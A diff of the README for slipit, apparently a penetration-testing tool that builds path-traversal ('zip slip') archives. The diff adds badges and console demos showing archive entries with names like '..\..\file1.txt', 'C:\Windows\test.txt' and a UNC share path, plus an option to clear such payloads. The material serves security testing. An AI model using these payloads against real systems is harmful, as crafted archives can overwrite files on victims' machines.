@@ -6,6 +6,33 @@
 It is basically a successor of the famous [evilarc](https://github.com/ptoomey3/evilarc)
 utility with an extended feature set and improved base functionality.
 
+![](https://github.com/usdAG/slipit/workflows/main%20Python%20CI/badge.svg?branch=main)
+![](https://github.com/usdAG/slipit/workflows/develop%20Python%20CI/badge.svg?branch=develop)
+[![](https://img.shields.io/badge/version-1.0.0-blue)](https://github.com/usdAG/slipit/releases)
+[![](https://img.shields.io/badge/build%20system-pip-blue)](https://pypi.org/project/slipit)
+![](https://img.shields.io/badge/python-9%2b-blue)
+[![](https://img.shields.io/badge/license-GPL%20v3.0-blue)](https://github.com/usdAG/slipit/blob/main/LICENSE)
+
+```console
+[user@host ~]$ slipit archive.tar.gz
+?rw-r--r-- user/user         24 2022-08-25 10:57:35 legit.txt
+[user@host ~]$ slipit archive.tar.gz file1.txt file2.txt
+[user@host ~]$ slipit archive.tar.gz
+?rw-r--r-- user/user         24 2022-08-25 10:57:35 legit.txt
+?rw-r--r-- user/user          3 2022-08-25 10:56:41 ..\..\..\..\..\..\file1.txt
+?rw-r--r-- user/user          3 2022-08-25 10:56:44 ..\..\..\..\..\..\file2.txt
+[user@host ~]$ slipit archive.tar.gz file1.txt --depth 3 --increment 1
+[user@host ~]$ slipit archive.tar.gz
+?rw-r--r-- user/user         24 2022-08-25 10:57:35 legit.txt
+?rw-r--r-- user/user          3 2022-08-25 10:56:41 ..\..\..\..\..\..\file1.txt
+?rw-r--r-- user/user          3 2022-08-25 10:56:44 ..\..\..\..\..\..\file2.txt
+?rw-r--r-- user/user          3 2022-08-25 10:56:41 ..\file1.txt
+?rw-r--r-- user/user          3 2022-08-25 10:56:41 ..\..\file1.txt
+?rw-r--r-- user/user          3 2022-08-25 10:56:41 ..\..\..\file1.txt
+[user@host ~]$ slipit archive.tar.gz --clear
+[user@host ~]$ slipit archive.tar.gz
+?rw-r--r-- user/user         24 2022-08-25 10:57:35 legit.txt
+```
 
 ### Installation
 
@@ -31,7 +58,7 @@ autocompletion.
 ----
 
 ```console
-[user@box ~]$ slipit -h
+[user@host ~]$ slipit -h
 usage: slipit [-h] [--archive-type {zip,tar,tgz,bz2}] [--clear] [--debug] [--depth int] [--increment int]
               [--overwrite] [--prefix string] [--multi] [--remove name] [--separator char] [--sequence seq]
               [--static content] [--symlink target] archive [filename ...]
@@ -67,7 +94,7 @@ automatically depending on the file extension for non existing archives or by th
 archives. You can also specify the archive type manually by using the `--archive-type` option.
 
 ```console
-[user@box ~]$ slipit example.zip 
+[user@host ~]$ slipit example.zip 
 File Name                                             Modified             Size
 example/                                       2022-02-02 18:39:00            0
 example/images/                                2022-02-02 18:40:16            0
@@ -76,8 +103,8 @@ example/images/beach.png                       2022-02-02 18:40:16         2112
 example/documents/                             2022-02-02 18:39:48            0
 example/documents/invoice.docx                 2022-02-02 18:39:40         3001
 example/documents/important.docx               2022-02-02 18:39:48          121
-[user@box ~]$ slipit example.zip test.txt
-[user@box ~]$ slipit example.zip 
+[user@host ~]$ slipit example.zip test.txt
+[user@host ~]$ slipit example.zip 
 File Name                                             Modified             Size
 example/                                       2022-02-02 18:39:00            0
 example/images/                                2022-02-02 18:40:16            0
@@ -95,8 +122,8 @@ them within the archive. Often times this is not necessary and you just require 
 only the filenames of the specified input files are used within the archive, while their content is set to `<string>`.
 
 ```console
-[user@box ~]$ slipit example.zip test2.txt --static 'HELLO WORLD :D'
-[user@box ~]$ slipit example.zip 
+[user@host ~]$ slipit example.zip test2.txt --static 'HELLO WORLD :D'
+[user@host ~]$ slipit example.zip 
 File Name                                             Modified             Size
 example/                                       2022-02-02 18:39:00            0
 example/images/                                2022-02-02 18:40:16            0
@@ -112,8 +139,8 @@ example/documents/important.docx               2022-02-02 18:39:48          121
 By using the `--clear` option, you can clear an archive from path traversal payloads.
 
 ```console
-[user@box ~]$ slipit --clear example.zip 
-[user@box ~]$ slipit example.zip 
+[user@host ~]$ slipit --clear example.zip 
+[user@host ~]$ slipit example.zip 
 File Name                                             Modified             Size
 example/                                       2022-02-02 18:39:00            0
 example/images/                                2022-02-02 18:40:16            0
@@ -127,8 +154,8 @@ example/documents/important.docx               2022-02-02 18:39:48          121
 *slipit* also allows to create an archive containing multiple payloads by using the `--multi` option:
 
 ```console
-[user@box ~]$ slipit example.zip test.txt --static content --multi
-[user@box ~]$ slipit example.zip 
+[user@host ~]$ slipit example.zip test.txt --static content --multi
+[user@host ~]$ slipit example.zip 
 File Name                                             Modified             Size
 C:\Windows\test.txt                            2022-02-03 09:35:28            7
 \\10.10.10.1\share\test.txt                    2022-02-03 09:35:28            7
